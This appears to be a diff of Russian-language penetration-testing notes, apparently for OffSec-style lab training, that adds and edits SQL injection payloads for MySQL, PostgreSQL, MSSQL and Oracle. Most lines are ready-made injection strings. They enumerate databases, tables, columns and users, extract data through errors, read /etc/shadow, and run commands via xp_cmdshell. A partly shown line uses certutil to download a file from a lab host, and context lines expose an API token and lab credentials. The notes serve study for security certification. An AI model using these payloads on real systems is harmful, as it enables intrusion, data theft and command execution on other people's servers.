@@ -264,10 +264,11 @@ cmd=cmd.exe /c "cd /d %TEMP% && certutil -urlcache -split -f http://192.168.45.2
 
 ================SQL INJECTION. MySQL 3306
 ПОРЯДОК проверки SQLi:
-1) error-based: ' or 1=1 -- //"
-2) union-based: ' ORDER BY 6 -- // --> ' UNION select 1, 2 -- // 
+1) error-based: ' or 1=1 -- //"		работает, если включен вывод SQL ошибок
+2) union-based: ' ORDER BY 6 -- // --> ' UNION select null, null -- // 
 3) boolean-based: ' and 1=1 --  // должен вернуть данные, and 1=2 - не должен вернуть данные
 4) time-based: ' and if(1=1,sleep(3),0)
+
 SELECT * FROM users WHERE username = '[INPUT]' 		=> ' or 1=1 -- //	MSSQL, MySQL, PostgreSQL, Oracle
 SELECT * FROM users WHERE (username = '[INPUT]') 	=> ') or 1=1 -- //	
 SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?
@@ -296,12 +297,10 @@ select load_file('/etc/passwd')  -- // чтение файла (нужны права)
 
 ' or 1=1 -- //	хотя бы 1 пробел после --
 ' or '1'='1 	для того, чтобы не ломать запрос и не коментить конец запроса	
-' or 1=1 in (select version()) -- //
-' or 1=1 in (select database()) -- // текущая БД
-' or 1=1 in (select schema_name from information_schema.schemata) -- // все БД
-' or 1=1 in (select table_name 	from information_schema.tables	WHERE table_schema='offsec') -- // таблицы в БД offsec
-' or 1=1 in (select column_name	from information_schema.columns	WHERE table_name='users') -- // колонки в таблице users в БД offsec
-' or 1=1 in (select username from users) -- //
+select database()	текущая БД
+select schema_name 	from information_schema.schemata				все БД
+select table_name 	from information_schema.tables	WHERE table_schema='offsec'	таблицы в БД offsec
+select column_name	from information_schema.columns	WHERE table_name='users'	колонки в таблице users в БД offsec
 
 ' ORDER BY 6 -- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
 %' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
@@ -332,12 +331,13 @@ wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7
 '+union+select+null,cast(current_user+as+int),null,null,null,null+--
 ' and 1=cast(current_database() as int) -- //	вывод данных через ошибку, текущая БД
 ' and 1=cast(current_schema() as int) -- //	вывод текущей схемы текущей БД
-' and 1=cast((select string_agg(datname, ', ') from pg_database) as int) -- // вывод всех БД на сервере
-' and 1=cast((select string_agg(schema_name, ', ') from information_schema.schemata) as int) -- // вывод всех схем текущей БД
-' and 1=cast((select string_agg(table_name, ', ') from information_schema.tables where table_schema='public') as int) -- // таблицы
+' and 1=cast((select string_agg(datname,',') from pg_database) as int) -- // вывод всех БД на сервере
+' and 1=cast((select string_agg(schema_name,',') from information_schema.schemata) as int) -- // вывод всех схем текущей БД
+' and 1=cast((select string_agg(table_name,',') from information_schema.tables where table_schema='public') as int) -- // таблицы
 ' and 1=cast((select string_agg(column_name, ', ') from information_schema.columns where table_name='users') as int) -- // колонки
 ' and 1=cast((select string_agg(weight||'|'||height||'|'||created_at||'|'||active||'|'||gender||'|'||email, '; ') from users) as int) -- //
 ' and 1=cast(pg_read_file('/etc/shadow') as int) -- // чтение файлов - единственное, что обычно может быть доступно в PostgreSQL
+' SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END -- проверка условия по времени
 
 ================SQL INJECTION. MSSQL 1433
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -365,6 +365,20 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 CREATE TABLE #tmp (output VARCHAR(1000)); INSERT INTO #tmp EXECUTE xp_cmdshell 'whoami'; 
 IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay '00:00:05'; DROP TABLE #tmp; 
 
+================SQL INJECTION. Oracle 1521
+количество колонок в SELECT должно быть не меньше, чем реальное количество колонок в таблице запроса FROM
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,NULL+FROM+v$version--
+	таблица dual всегда есть, обязательно from в запросах
+'+union+select+null,ora_database_name+from+dual+--+				текущая БД, в Oracle только 1 БД для всех
+'+union+select+null,sys_context('USERENV','CURRENT_SCHEMA')+from+dual+--+	текущий пользователь (схема)
+'+union+select+null,user+from+dual+--+						текущий пользователь (схема)
+'+union+select+null,username+from+all_users+--+					все пользователи
+'+union+select+null,owner+from+all_tables+--+	все пользователи (схемы), для которых есть таблицы, и к кому есть доступ у текущего пользователя
+'+union+select+null,table_name+from+all_tables+--+				все таблицы, доступные на чтение
+'+union+select+null,table_name+from+user_tables+--+				все таблицы данного пользователя
+'+union+select+null,column_name+from+all_tab_columns'+--+				все колонки из всех таблиц
+'+union+select+null,column_name+from+user_tab_columns+where+table_name='USERS'+--+	колонки из таблицы USERS
 
 ================FUZZING
 gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
